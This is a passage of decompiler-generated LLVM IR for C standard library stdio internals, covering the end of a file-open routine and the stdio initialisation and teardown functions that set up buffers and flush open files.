  %v2_804cc11 = add i32 %v1_804cbf7, 8
  %v3_804cc11 = inttoptr i32 %v2_804cc11 to i32*
  store i32 0, i32* %v3_804cc11, align 4
  %v2_804cc18 = add i32 %v1_804cbf7, 56
  store i32 %v2_804cc18, i32* %eax.global-to-local, align 4
  store i32 %v2_804cc18, i32* %stack_var_-76, align 4
  %v1_804cc1c = call i32 @__stdio_init_mutex(i32 %v2_804cc18)
  store i32 %v1_804cc1c, i32* %eax.global-to-local, align 4
  %v0_804cc71.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804cc24

dec_label_pc_804cc24:                             ; preds = %dec_label_pc_804cbee, %dec_label_pc_804cc09
  %v2_804cc77 = phi i32 [ %v0_804cc717, %dec_label_pc_804cbee ], [ %v0_804cc71.pre, %dec_label_pc_804cc09 ]
  %v2_804cc24 = icmp slt i32 %arg4, 0
  br i1 %v2_804cc24, label %dec_label_pc_804cc71, label %dec_label_pc_804cc28

dec_label_pc_804cc28:                             ; preds = %dec_label_pc_804cc24
  %v1_804cc2a = and i32 %v2_804cc77, 32771
  %v1_804cc30 = add nuw nsw i32 %v1_804cc2a, 1
  store i32 %v1_804cc30, i32* @edx, align 4
  %v0_804cc31 = load i32, i32* @esi, align 4
  %v1_804cc31 = add i32 %v0_804cc31, 1
  %v2_804cc34 = and i32 %v1_804cc31, %v1_804cc30
  store i32 %v2_804cc34, i32* %eax.global-to-local, align 4
  %v12_804cc36 = icmp eq i32 %v2_804cc34, %v1_804cc30
  %v1_804cc38 = load i32, i32* @ebp, align 4
  %v2_804cc38 = add i32 %v1_804cc38, 4
  %v3_804cc38 = inttoptr i32 %v2_804cc38 to i32*
  store i32 %arg4, i32* %v3_804cc38, align 4
  %v1_804cc3b = icmp eq i1 %v12_804cc36, false
  br i1 %v1_804cc3b, label %dec_label_pc_804cba6, label %dec_label_pc_804cc41

dec_label_pc_804cc41:                             ; preds = %dec_label_pc_804cc28
  %v0_804cc41 = load i32, i32* @esi, align 4
  %v1_804cc43 = and i32 %v0_804cc41, 1024
  %v1_804cc45 = xor i32 %v1_804cc43, 1024
  store i32 %v1_804cc45, i32* %eax.global-to-local, align 4
  %v1_804cc4a = load i32, i32* @ebx, align 4
  %v2_804cc4a = and i32 %v1_804cc4a, %v1_804cc45
  %v3_804cc4a = icmp eq i32 %v2_804cc4a, 0
  br i1 %v3_804cc4a, label %dec_label_pc_804cc41.dec_label_pc_804cc67_crit_edge, label %dec_label_pc_804cc4e

dec_label_pc_804cc41.dec_label_pc_804cc67_crit_edge: ; preds = %dec_label_pc_804cc41
  br label %dec_label_pc_804cc67

dec_label_pc_804cc4e:                             ; preds = %dec_label_pc_804cc41
  store i32 %arg4, i32* %stack_var_-76, align 4
  %v3_804cc57 = call i32 @__libc_fcntl(i32 %arg4, i32 4, i32 1024)
  store i32 %v3_804cc57, i32* %eax.global-to-local, align 4
  %v1_804cc5f = icmp eq i32 %v3_804cc57, 0
  %v1_804cc61 = icmp eq i1 %v1_804cc5f, false
  br i1 %v1_804cc61, label %dec_label_pc_804cba6, label %dec_label_pc_804cc4e.dec_label_pc_804cc67_crit_edge

dec_label_pc_804cc4e.dec_label_pc_804cc67_crit_edge: ; preds = %dec_label_pc_804cc4e
  %v0_804cc67.pre = load i32, i32* @esi, align 4
  %v0_804cc6d.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804cc67

dec_label_pc_804cc67:                             ; preds = %dec_label_pc_804cc41.dec_label_pc_804cc67_crit_edge, %dec_label_pc_804cc4e.dec_label_pc_804cc67_crit_edge
  %v0_804cc6d = phi i32 [ %v1_804cc4a, %dec_label_pc_804cc41.dec_label_pc_804cc67_crit_edge ], [ %v0_804cc6d.pre, %dec_label_pc_804cc4e.dec_label_pc_804cc67_crit_edge ]
  %v0_804cc67 = phi i32 [ %v0_804cc41, %dec_label_pc_804cc41.dec_label_pc_804cc67_crit_edge ], [ %v0_804cc67.pre, %dec_label_pc_804cc4e.dec_label_pc_804cc67_crit_edge ]
  %v1_804cc67 = and i32 %v0_804cc67, 32768
  %v2_804cc6d = or i32 %v1_804cc67, %v0_804cc6d
  store i32 %v2_804cc6d, i32* @ebx, align 4
  br label %dec_label_pc_804cc95

dec_label_pc_804cc71:                             ; preds = %dec_label_pc_804cc24
  %v11_804cc73 = or i32 %v2_804cc77, 32768
  store i32 %v11_804cc73, i32* %eax.global-to-local, align 4
  %v1_804cc76 = add i32 %arg4, 1
  %v8_804cc76 = icmp eq i32 %v1_804cc76, 0
  store i32 %v1_804cc76, i32* @edi, align 4
  %v1_804cc77 = icmp eq i1 %v8_804cc76, false
  %v4_804cc77 = select i1 %v1_804cc77, i32 %v11_804cc73, i32 %v2_804cc77
  store i32 %v4_804cc77, i32* @ebx, align 4
  %v0_804cc81 = load i32, i32* @esi, align 4
  store i32 %v0_804cc81, i32* %stack_var_-76, align 4
  %v3_804cc82 = inttoptr i32 %v0_804cc81 to i8*
  %v4_804cc82 = call i32 @__libc_open(i8* %v3_804cc82, i32 %v4_804cc77, i32 438)
  store i32 %v4_804cc82, i32* %eax.global-to-local, align 4
  %v2_804cc8a = icmp slt i32 %v4_804cc82, 0
  %v1_804cc8c = load i32, i32* @ebp, align 4
  %v2_804cc8c = add i32 %v1_804cc8c, 4
  %v3_804cc8c = inttoptr i32 %v2_804cc8c to i32*
  store i32 %v4_804cc82, i32* %v3_804cc8c, align 4
  br i1 %v2_804cc8a, label %dec_label_pc_804cbb9, label %dec_label_pc_804cc95

dec_label_pc_804cc95:                             ; preds = %dec_label_pc_804cc71, %dec_label_pc_804cc67
  %v0_804cc95 = load i32, i32* @ebp, align 4
  %v1_804cc95 = inttoptr i32 %v0_804cc95 to i32*
  %v2_804cc95 = load i32, i32* %v1_804cc95, align 4
  %v2_804cc95.tr = trunc i32 %v2_804cc95 to i16
  %v1_804cc9d = and i16 %v2_804cc95.tr, 8192
  %v3_804cc9d = inttoptr i32 %v0_804cc95 to i16*
  store i16 %v1_804cc9d, i16* %v3_804cc9d, align 2
  %v0_804cca1 = load i32, i32* @ebx, align 4
  store i32 %v0_804cca1, i32* %eax.global-to-local, align 4
  %v1_804cca3 = and i32 %v0_804cca1, -31744
  %v0_804cca9 = load i32, i32* @ebp, align 4
  %v1_804cca9 = inttoptr i32 %v0_804cca9 to i32*
  %v2_804cca9 = load i32, i32* %v1_804cca9, align 4
  %v1_804ccac = mul i32 %v0_804cca1, 16
  %v1_804ccaf = and i32 %v1_804ccac, 48
  %v1_804ccb0 = add nuw nsw i32 %v1_804ccaf, 16
  %v2_804ccb3 = xor i32 %v1_804ccb0, 48
  %v2_804ccb6 = or i32 %v2_804cca9, %v1_804cca3
  %v2_804ccb8 = or i32 %v2_804ccb6, %v2_804ccb3
  store i32 %v2_804ccb8, i32* %eax.global-to-local, align 4
  %v1_804ccba = trunc i32 %v2_804ccb8 to i16
  %v3_804ccba = inttoptr i32 %v0_804cca9 to i16*
  store i16 %v1_804ccba, i16* %v3_804ccba, align 2
  %v0_804ccbe = load i32, i32* %stack_var_-76, align 4
  %v1_804ccbe = call i32 @__errno_location(i32 %v0_804ccbe)
  store i32 %v1_804ccbe, i32* %eax.global-to-local, align 4
  %v0_804ccc6 = load i32, i32* @ebp, align 4
  %v1_804ccc6 = inttoptr i32 %v0_804ccc6 to i16*
  %v2_804ccc6 = load i16, i16* %v1_804ccc6, align 2
  %v3_804ccc6 = zext i16 %v2_804ccc6 to i32
  store i32 %v3_804ccc6, i32* @ebx, align 4
  %v1_804ccca = inttoptr i32 %v1_804ccbe to i32*
  %v2_804ccca = load i32, i32* %v1_804ccca, align 4
  store i32 %v2_804ccca, i32* @edi, align 4
  store i32 %v1_804ccbe, i32* @esi, align 4
  %v1_804ccce = add i32 %v0_804ccc6, 4
  %v2_804ccce = inttoptr i32 %v1_804ccce to i32*
  %v3_804ccce = load i32, i32* %v2_804ccce, align 4
  store i32 %v3_804ccce, i32* %stack_var_-76, align 4
  %v1_804ccd1 = call i32 @isatty(i32 %v3_804ccce)
  %v2_804ccd9 = mul i32 %v1_804ccd1, 256
  store i32 %v2_804ccd9, i32* %eax.global-to-local, align 4
  %v0_804ccdc = load i32, i32* @ebx, align 4
  %v2_804ccdc = or i32 %v0_804ccdc, %v2_804ccd9
  store i32 %v2_804ccdc, i32* @ebx, align 4
  %v1_804ccde = trunc i32 %v2_804ccdc to i16
  %v2_804ccde = load i32, i32* @ebp, align 4
  %v3_804ccde = inttoptr i32 %v2_804ccde to i16*
  store i16 %v1_804ccde, i16* %v3_804ccde, align 2
  %v0_804cce2 = load i32, i32* @edi, align 4
  %v1_804cce2 = load i32, i32* @esi, align 4
  %v2_804cce2 = inttoptr i32 %v1_804cce2 to i32*
  store i32 %v0_804cce2, i32* %v2_804cce2, align 4
  %v0_804cce4 = load i32, i32* @ebp, align 4
  %v1_804cce4 = add i32 %v0_804cce4, 8
  %v2_804cce4 = inttoptr i32 %v1_804cce4 to i32*
  %v3_804cce4 = load i32, i32* %v2_804cce4, align 4
  %v4_804cce4 = icmp eq i32 %v3_804cce4, 0
  %v1_804cce8 = icmp eq i1 %v4_804cce4, false
  br i1 %v1_804cce8, label %dec_label_pc_804cd1c, label %dec_label_pc_804ccea

dec_label_pc_804ccea:                             ; preds = %dec_label_pc_804cc95
  store i32 4096, i32* %stack_var_-76, align 4
  %v1_804ccf2 = call i32 @malloc(i32 4096)
  store i32 %v1_804ccf2, i32* %eax.global-to-local, align 4
  %v1_804ccfa = icmp eq i32 %v1_804ccf2, 0
  %v1_804ccfc = load i32, i32* @ebp, align 4
  %v2_804ccfc = add i32 %v1_804ccfc, 8
  %v3_804ccfc = inttoptr i32 %v2_804ccfc to i32*
  store i32 %v1_804ccf2, i32* %v3_804ccfc, align 4
  br i1 %v1_804ccfa, label %dec_label_pc_804cd15, label %dec_label_pc_804cd01

dec_label_pc_804cd01:                             ; preds = %dec_label_pc_804ccea
  %v1_804cd01 = add i32 %v1_804ccf2, 4096
  store i32 %v1_804cd01, i32* %eax.global-to-local, align 4
  %v1_804cd06 = load i32, i32* @ebp, align 4
  %v2_804cd06 = add i32 %v1_804cd06, 12
  %v3_804cd06 = inttoptr i32 %v2_804cd06 to i32*
  store i32 %v1_804cd01, i32* %v3_804cd06, align 4
  %v0_804cd09 = load i32, i32* @ebp, align 4
  %v1_804cd09 = inttoptr i32 %v0_804cd09 to i32*
  %v2_804cd09 = load i32, i32* %v1_804cd09, align 4
  %v1_804cd0c = udiv i32 %v2_804cd09, 256
  %v3_804cd0c = and i32 %v1_804cd0c, 191
  %v8_804cd0c = or i32 %v3_804cd0c, 64
  %v10_804cd0c = mul nuw nsw i32 %v8_804cd0c, 256
  %v11_804cd0c = and i32 %v2_804cd09, -65281
  %v12_804cd0c = or i32 %v10_804cd0c, %v11_804cd0c
  store i32 %v12_804cd0c, i32* %eax.global-to-local, align 4
  %v1_804cd0f = trunc i32 %v12_804cd0c to i16
  %v3_804cd0f = inttoptr i32 %v0_804cd09 to i16*
  store i16 %v1_804cd0f, i16* %v3_804cd0f, align 2
  br label %dec_label_pc_804cd1c

dec_label_pc_804cd15:                             ; preds = %dec_label_pc_804ccea
  %v0_804cd15 = load i32, i32* @ebp, align 4
  %v1_804cd15 = add i32 %v0_804cd15, 12
  %v2_804cd15 = inttoptr i32 %v1_804cd15 to i32*
  store i32 0, i32* %v2_804cd15, align 4
  br label %dec_label_pc_804cd1c

dec_label_pc_804cd1c:                             ; preds = %dec_label_pc_804cc95, %dec_label_pc_804cd01, %dec_label_pc_804cd15
  %v0_804cd1c = load i32, i32* @ebp, align 4
  %v1_804cd1c = add i32 %v0_804cd1c, 8
  %v2_804cd1c = inttoptr i32 %v1_804cd1c to i32*
  %v3_804cd1c = load i32, i32* %v2_804cd1c, align 4
  store i32 %v3_804cd1c, i32* %eax.global-to-local, align 4
  %v1_804cd1f = add i32 %v0_804cd1c, 2
  %v2_804cd1f = inttoptr i32 %v1_804cd1f to i8*
  store i8 0, i8* %v2_804cd1f, align 1
  %v0_804cd23 = load i32, i32* @ebp, align 4
  %v1_804cd23 = add i32 %v0_804cd23, 44
  %v2_804cd23 = inttoptr i32 %v1_804cd23 to i32*
  store i32 0, i32* %v2_804cd23, align 4
  %v0_804cd2a = load i32, i32* @ebp, align 4
  %v1_804cd2a = add i32 %v0_804cd2a, 1
  %v2_804cd2a = inttoptr i32 %v1_804cd2a to i8*
  %v3_804cd2a = load i8, i8* %v2_804cd2a, align 1
  %v4_804cd2a = and i8 %v3_804cd2a, 32
  %v5_804cd2a = icmp eq i8 %v4_804cd2a, 0
  %v0_804cd2e = load i32, i32* %eax.global-to-local, align 4
  %v2_804cd2e = add i32 %v0_804cd2a, 24
  %v3_804cd2e = inttoptr i32 %v2_804cd2e to i32*
  store i32 %v0_804cd2e, i32* %v3_804cd2e, align 4
  %v0_804cd31 = load i32, i32* %eax.global-to-local, align 4
  %v1_804cd31 = load i32, i32* @ebp, align 4
  %v2_804cd31 = add i32 %v1_804cd31, 28
  %v3_804cd31 = inttoptr i32 %v2_804cd31 to i32*
  store i32 %v0_804cd31, i32* %v3_804cd31, align 4
  %v0_804cd34 = load i32, i32* %eax.global-to-local, align 4
  %v1_804cd34 = load i32, i32* @ebp, align 4
  %v2_804cd34 = add i32 %v1_804cd34, 16
  %v3_804cd34 = inttoptr i32 %v2_804cd34 to i32*
  store i32 %v0_804cd34, i32* %v3_804cd34, align 4
  %v0_804cd37 = load i32, i32* %eax.global-to-local, align 4
  %v1_804cd37 = load i32, i32* @ebp, align 4
  %v2_804cd37 = add i32 %v1_804cd37, 20
  %v3_804cd37 = inttoptr i32 %v2_804cd37 to i32*
  store i32 %v0_804cd37, i32* %v3_804cd37, align 4
  %v0_804cd3a = load i32, i32* @global_var_80521c0.101, align 64
  store i32 %v0_804cd3a, i32* @eax, align 4
  %v1_804cd3f = load i32, i32* @ebp, align 4
  %v2_804cd3f = add i32 %v1_804cd3f, 52
  %v3_804cd3f = inttoptr i32 %v2_804cd3f to i32*
  store i32 %v0_804cd3a, i32* %v3_804cd3f, align 4
  br i1 %v5_804cd2a, label %dec_label_pc_804cdb1, label %dec_label_pc_804cd44

dec_label_pc_804cd44:                             ; preds = %dec_label_pc_804cd1c
  %v2_804cd4f = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_804cd4f, i32* %stack_var_-76, align 4
  %v2_804cd54 = call i32 @__pthread_return_void(i32 %v2_804cd4f, i32 134526883)
  store i32 %v2_804cd54, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_80521a8.98 to i32), i32* %stack_var_-76, align 4
  %v1_804cd60 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_80521a8.98 to i32))
  store i32 %v1_804cd60, i32* @eax, align 4
  %v2_804cd72 = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_804cd72, i32* %stack_var_-76, align 4
  %v2_804cd77 = call i32 @__pthread_return_void(i32 %v2_804cd72, i32 134526883)
  store i32 %v2_804cd77, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_8052190.102 to i32), i32* %stack_var_-76, align 4
  %v1_804cd83 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_8052190.102 to i32))
  %v0_804cd88 = load i32, i32* bitcast (i32** @global_var_805218c.104 to i32*), align 4
  store i32 %v0_804cd88, i32* @eax, align 4
  %v1_804cd8d = load i32, i32* @ebp, align 4
  %v2_804cd8d = add i32 %v1_804cd8d, 32
  %v3_804cd8d = inttoptr i32 %v2_804cd8d to i32*
  store i32 %v0_804cd88, i32* %v3_804cd8d, align 4
  %v2_804cd90 = load i32, i32* %stack_var_-76, align 4
  store i32 %v2_804cd90, i32* @ecx, align 4
  %v0_804cd91 = load i32, i32* @ebp, align 4
  store i32 %v0_804cd91, i32* bitcast (i32** @global_var_805218c.104 to i32*), align 4
  store i32 %v2_804cd72, i32* %stack_var_-76, align 4
  %v2_804cd9b = call i32 @__pthread_return_void(i32 %v2_804cd72, i32 1)
  store i32 %v2_804cd72, i32* @eax, align 4
  store i32 1, i32* @edx, align 4
  store i32 %v2_804cd4f, i32* %stack_var_-76, align 4
  %v2_804cda5 = call i32 @__pthread_return_void(i32 %v2_804cd4f, i32 1)
  br label %dec_label_pc_804cdaa

dec_label_pc_804cdaa:                             ; preds = %dec_label_pc_804cbc3, %dec_label_pc_804cd44
  %storemerge = phi i32 [ %v2_804cda5, %dec_label_pc_804cd44 ], [ %v1_804cbc9, %dec_label_pc_804cbc3 ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804cdb1

dec_label_pc_804cdaf:                             ; preds = %dec_label_pc_804cbb9, %dec_label_pc_804cba6
  store i32 0, i32* @ebp, align 4
  br label %dec_label_pc_804cdb1

dec_label_pc_804cdb1:                             ; preds = %dec_label_pc_804cd1c, %dec_label_pc_804cbf2, %dec_label_pc_804cdaa, %dec_label_pc_804cdaf
  %v0_804cdb4 = load i32, i32* @ebp, align 4
  store i32 %v0_804cdb4, i32* %eax.global-to-local, align 4
  %v2_804cdb6 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_804cdb6, i32* @ebx, align 4
  store i32 %v0_804cb7a, i32* @esi, align 4
  store i32 %v0_804cb79, i32* @edi, align 4
  store i32 %v0_804cb78, i32* @ebp, align 4
  ret i32 %v0_804cdb4

; uselistorder directives
  uselistorder i32 %v2_804cd72, { 0, 2, 1, 4, 3 }
  uselistorder i32 %v2_804cd4f, { 1, 0, 3, 2 }
  uselistorder i32 %v2_804cd09, { 1, 0 }
  uselistorder i32 %v1_804ccf2, { 0, 2, 1, 3 }
  uselistorder i32 %v2_804ccd9, { 1, 0 }
  uselistorder i32 %v1_804ccbe, { 1, 0, 2 }
  uselistorder i32 %v11_804cc73, { 1, 0 }
  uselistorder i32 %v1_804cc45, { 1, 0 }
  uselistorder i32 %v0_804cc41, { 1, 0 }
  uselistorder i32 %v2_804cc77, { 1, 0, 2 }
  uselistorder i32 %v1_804cbf7, { 0, 1, 4, 2, 3, 5 }
  uselistorder i32* %stack_var_-16, { 1, 0, 2 }
  uselistorder i32* %stack_var_-76, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 0, 10, 11, 12, 13, 14 }
  uselistorder i32* %eax.global-to-local, { 1, 0, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 14, 13, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 27, 25, 26 }
  uselistorder i32 -65281, { 1, 0 }
  uselistorder i32 (i8*, i32, i32)* @__libc_open, { 1, 0, 2 }
  uselistorder i32 32768, { 0, 2, 1 }
  uselistorder i32 (i32, i32, i32)* @__libc_fcntl, { 5, 0, 4, 3, 2, 1 }
  uselistorder i32 577, { 0, 2, 1 }
  uselistorder i32 %arg4, { 0, 3, 2, 4, 1, 5 }
  uselistorder label %dec_label_pc_804cdb1, { 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_804cdaa, { 1, 0 }
  uselistorder label %dec_label_pc_804cd1c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804cc67, { 1, 0 }
  uselistorder label %dec_label_pc_804cc24, { 1, 0 }
  uselistorder label %dec_label_pc_804cbee, { 1, 0 }
  uselistorder label %dec_label_pc_804cbd5, { 2, 0, 1 }
}

define i32 @_stdio_init() local_unnamed_addr {
entry:
  %ebp.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_804cdbd = load i32, i32* @edi, align 4
  %v0_804cdbe = load i32, i32* @esi, align 4
  %v0_804cdbf = load i32, i32* @ebx, align 4
  store i32 %v0_804cdbf, i32* %stack_var_-16, align 4
  store i32 1, i32* @ebx, align 4
  %v1_804cdc8 = call i32 @__errno_location(i32 %v0_804cdbf)
  %v0_804cdd0 = load i16, i16* @global_var_80521e0.103, align 32
  %v1_804cdd0 = zext i16 %v0_804cdd0 to i32
  store i32 %v1_804cdd0, i32* @esi, align 4
  %v1_804cdd7 = inttoptr i32 %v1_804cdc8 to i32*
  %v2_804cdd7 = load i32, i32* %v1_804cdd7, align 4
  store i32 %v2_804cdd7, i32* %ebp.global-to-local, align 4
  store i32 %v1_804cdc8, i32* @edi, align 4
  %v1_804cddd = call i32 @isatty(i32 0)
  %v0_804cde2 = load i32, i32* @ebx, align 4
  %v2_804cdeb = sub i32 %v0_804cde2, %v1_804cddd
  %v2_804cdef = mul i32 %v2_804cdeb, 256
  %v0_804cdf2 = load i32, i32* @esi, align 4
  %v2_804cdf2 = xor i32 %v0_804cdf2, %v2_804cdef
  %v1_804cdf4 = trunc i32 %v2_804cdf2 to i16
  store i16 %v1_804cdf4, i16* @global_var_80521e0.103, align 32
  %v0_804cdfb = load i16, i16* @global_var_8052230.105, align 16
  %v1_804cdfb = zext i16 %v0_804cdfb to i32
  store i32 %v1_804cdfb, i32* @esi, align 4
  %v1_804ce02 = call i32 @isatty(i32 1)
  %v0_804ce07 = load i32, i32* @ebx, align 4
  %v2_804ce07 = sub i32 %v0_804ce07, %v1_804ce02
  %v2_804ce09 = mul i32 %v2_804ce07, 256
  %v0_804ce0c = load i32, i32* @esi, align 4
  %v2_804ce0c = xor i32 %v2_804ce09, %v0_804ce0c
  %v1_804ce0e = trunc i32 %v2_804ce0c to i16
  store i16 %v1_804ce0e, i16* @global_var_8052230.105, align 16
  %v0_804ce15 = load i32, i32* %ebp.global-to-local, align 4
  %v1_804ce15 = load i32, i32* @edi, align 4
  %v2_804ce15 = inttoptr i32 %v1_804ce15 to i32*
  store i32 %v0_804ce15, i32* %v2_804ce15, align 4
  %v2_804ce1a = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_804ce1a, i32* @ebx, align 4
  store i32 %v0_804cdbe, i32* @esi, align 4
  store i32 %v0_804cdbd, i32* @edi, align 4
  ret i32 %v1_804ce02

; uselistorder directives
  uselistorder i32 %v1_804cdc8, { 1, 0 }
  uselistorder i16* @global_var_8052230.105, { 1, 0 }
  uselistorder i32 (i32)* @isatty, { 1, 0, 2 }
}

define i32 @__stdio_init_mutex(i32 %arg1) local_unnamed_addr {
entry:
  %v3_804ce2d = inttoptr i32 %arg1 to i16*
  %v4_804ce2d = call i32 @memcpy(i16* %v3_804ce2d, i32 ptrtoint (i32* @global_var_8050850.106 to i32), i32 24)
  ret i32 %v4_804ce2d
}

define i32 @_stdio_term() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_804ce36 = load i32, i32* @esi, align 4
  %v0_804ce37 = load i32, i32* @ebx, align 4
  store i32 %v0_804ce37, i32* %stack_var_-8, align 4
  %v1_804ce40 = call i32 @__stdio_init_mutex(i32 ptrtoint (i32* @global_var_8052190.102 to i32))
  store i32 %v1_804ce40, i32* %eax.global-to-local, align 4
  %v1_804ce4c = call i32 @__stdio_init_mutex(i32 ptrtoint (i32* @global_var_80521a8.98 to i32))
  store i32 %v1_804ce4c, i32* %eax.global-to-local, align 4
  %storemerge21 = load i32, i32* bitcast (i32** @global_var_805218c.104 to i32*), align 4
  store i32 %storemerge21, i32* %ebx.global-to-local, align 4
  %v1_804ce9622 = icmp eq i32 %storemerge21, 0
  %v1_804ce9824 = icmp eq i1 %v1_804ce9622, false
  br i1 %v1_804ce9824, label %dec_label_pc_804ce59.lr.ph, label %dec_label_pc_804ceb6.preheader

dec_label_pc_804ce59.lr.ph:                       ; preds = %entry
  br label %dec_label_pc_804ce59

dec_label_pc_804ce59:                             ; preds = %dec_label_pc_804ce59.lr.ph, %dec_label_pc_804ce80
  %storemerge25 = phi i32 [ %storemerge21, %dec_label_pc_804ce59.lr.ph ], [ %storemerge, %dec_label_pc_804ce80 ]
  %v1_804ce5c = add i32 %storemerge25, 56
  store i32 %v1_804ce5c, i32* @esi, align 4
  %v1_804ce60 = call i32 @__pthread_return_0(i32 %v1_804ce5c)
  store i32 %v1_804ce60, i32* %eax.global-to-local, align 4
  %v1_804ce68 = icmp eq i32 %v1_804ce60, 0
  br i1 %v1_804ce68, label %dec_label_pc_804ce80, label %dec_label_pc_804ce6c

dec_label_pc_804ce6c:                             ; preds = %dec_label_pc_804ce59
  %v0_804ce6c = load i32, i32* %ebx.global-to-local, align 4
  %v1_804ce6c = add i32 %v0_804ce6c, 8
  %v2_804ce6c = inttoptr i32 %v1_804ce6c to i32*
  %v3_804ce6c = load i32, i32* %v2_804ce6c, align 4
  store i32 %v3_804ce6c, i32* %eax.global-to-local, align 4
  %v1_804ce6f = inttoptr i32 %v0_804ce6c to i16*
  store i16 48, i16* %v1_804ce6f, align 2
  %v0_804ce74 = load i32, i32* %eax.global-to-local, align 4
  %v1_804ce74 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804ce74 = add i32 %v1_804ce74, 24
  %v3_804ce74 = inttoptr i32 %v2_804ce74 to i32*
  store i32 %v0_804ce74, i32* %v3_804ce74, align 4
  %v0_804ce77 = load i32, i32* %eax.global-to-local, align 4
  %v1_804ce77 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804ce77 = add i32 %v1_804ce77, 28
  %v3_804ce77 = inttoptr i32 %v2_804ce77 to i32*
  store i32 %v0_804ce77, i32* %v3_804ce77, align 4
  %v0_804ce7a = load i32, i32* %eax.global-to-local, align 4
  %v1_804ce7a = load i32, i32* %ebx.global-to-local, align 4
  %v2_804ce7a = add i32 %v1_804ce7a, 16
  %v3_804ce7a = inttoptr i32 %v2_804ce7a to i32*
  store i32 %v0_804ce7a, i32* %v3_804ce7a, align 4
  %v0_804ce7d = load i32, i32* %eax.global-to-local, align 4
  %v1_804ce7d = load i32, i32* %ebx.global-to-local, align 4
  %v2_804ce7d = add i32 %v1_804ce7d, 20
  %v3_804ce7d = inttoptr i32 %v2_804ce7d to i32*
  store i32 %v0_804ce7d, i32* %v3_804ce7d, align 4
  br label %dec_label_pc_804ce80

dec_label_pc_804ce80:                             ; preds = %dec_label_pc_804ce59, %dec_label_pc_804ce6c
  %v0_804ce83 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804ce83 = add i32 %v0_804ce83, 52
  %v2_804ce83 = inttoptr i32 %v1_804ce83 to i32*
  store i32 1, i32* %v2_804ce83, align 4
  %v0_804ce8a = load i32, i32* @esi, align 4
  %v1_804ce8b = call i32 @__stdio_init_mutex(i32 %v0_804ce8a)
  store i32 %v1_804ce8b, i32* %eax.global-to-local, align 4
  %v0_804ce90 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804ce90 = add i32 %v0_804ce90, 32
  %v2_804ce90 = inttoptr i32 %v1_804ce90 to i32*
  %storemerge = load i32, i32* %v2_804ce90, align 4
  store i32 %storemerge, i32* %ebx.global-to-local, align 4
  %v1_804ce96 = icmp eq i32 %storemerge, 0
  %v1_804ce98 = icmp eq i1 %v1_804ce96, false
  br i1 %v1_804ce98, label %dec_label_pc_804ce59, label %dec_label_pc_804ce93.dec_label_pc_804ceb6.preheader_crit_edge

dec_label_pc_804ce93.dec_label_pc_804ceb6.preheader_crit_edge: ; preds = %dec_label_pc_804ce80
  %storemerge12.pre = load i32, i32* bitcast (i32** @global_var_805218c.104 to i32*), align 4
  br label %dec_label_pc_804ceb6.preheader

dec_label_pc_804ceb6.preheader:                   ; preds = %dec_label_pc_804ce93.dec_label_pc_804ceb6.preheader_crit_edge, %entry
  %storemerge12 = phi i32 [ %storemerge12.pre, %dec_label_pc_804ce93.dec_label_pc_804ceb6.preheader_crit_edge ], [ %storemerge21, %entry ]
  store i32 %storemerge12, i32* @ebx, align 4
  %v1_804ceb63 = icmp eq i32 %storemerge12, 0
  %v1_804ceb810 = icmp eq i1 %v1_804ceb63, false
  br i1 %v1_804ceb810, label %dec_label_pc_804cea2.preheader, label %dec_label_pc_804ceba

dec_label_pc_804cea2.preheader:                   ; preds = %dec_label_pc_804ceb6.preheader
  br label %dec_label_pc_804cea2

dec_label_pc_804cea2:                             ; preds = %dec_label_pc_804cea2.preheader, %dec_label_pc_804ceb3
  %v0_804ceaa = phi i32 [ %storemerge1, %dec_label_pc_804ceb3 ], [ %storemerge12, %dec_label_pc_804cea2.preheader ]
  %v1_804cea2 = inttoptr i32 %v0_804ceaa to i8*
  %v2_804cea2 = load i8, i8* %v1_804cea2, align 1
  %v3_804cea2 = and i8 %v2_804cea2, 64
  %v4_804cea2 = icmp eq i8 %v3_804cea2, 0
  br i1 %v4_804cea2, label %dec_label_pc_804ceb3, label %dec_label_pc_804cea7

dec_label_pc_804cea7:                             ; preds = %dec_label_pc_804cea2
  %v1_804ceab = call i32 @__stdio_wcommit(i32 %v0_804ceaa)
  store i32 %v1_804ceab, i32* %eax.global-to-local, align 4
  %v0_804ceb3.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804ceb3

dec_label_pc_804ceb3:                             ; preds = %dec_label_pc_804cea2, %dec_label_pc_804cea7
  %v0_804ceb3 = phi i32 [ %v0_804ceaa, %dec_label_pc_804cea2 ], [ %v0_804ceb3.pre, %dec_label_pc_804cea7 ]
  %v1_804ceb3 = add i32 %v0_804ceb3, 32
  %v2_804ceb3 = inttoptr i32 %v1_804ceb3 to i32*
  %storemerge1 = load i32, i32* %v2_804ceb3, align 4
  store i32 %storemerge1, i32* @ebx, align 4
  %v1_804ceb6 = icmp eq i32 %storemerge1, 0
  %v1_804ceb8 = icmp eq i1 %v1_804ceb6, false
  br i1 %v1_804ceb8, label %dec_label_pc_804cea2, label %dec_label_pc_804ceba

dec_label_pc_804ceba:                             ; preds = %dec_label_pc_804ceb3, %dec_label_pc_804ceb6.preheader
  %v2_804ceba = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804ceba, i32* %eax.global-to-local, align 4
